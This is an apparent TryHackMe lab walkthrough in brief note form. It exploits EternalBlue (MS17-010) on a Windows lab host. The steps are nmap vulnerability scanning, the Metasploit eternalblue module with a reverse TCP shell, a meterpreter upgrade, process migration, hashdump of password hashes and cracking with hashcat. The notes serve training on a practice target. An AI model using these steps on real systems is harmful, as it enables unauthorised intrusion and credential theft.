#THM #Windows  #EthernalBlue

#### Nmap
* nmap scan the system 
```bash
nmap 10.10.193.252 -sC -sV -O --script vuln
```
* start msfconsole
* search for Ethernal Blue exploit
```bash
msfconsole
mfs6 > search blue
```
* Benutze exploit : exploit/windows/smb/ms17_010_eternalblue
* Set required RHOSTS to 10.10.193.252
*  set payload windows/x64/shell/reverse_tcp
* Run!

* upgrade regular shell to meterpreter (linux like console)
```bash
mfs6 > use post/multi/manage/shell_to_meterpreter
mfs6 > set SESSION 1
mfs6 > run
```
* use ps to show all processes running on maschine 
* use migrate pid to migrate into a process

```bash
mfs6 > migrate PROCESS_ID
mfs6 > shell (if we want regular windows shell)
```

* use 'hashdump' to dump all useres with hased passwords
	* use crackingstation or hashcat etc. to crack password
* use 'search -f flag*.txt' to find all flag files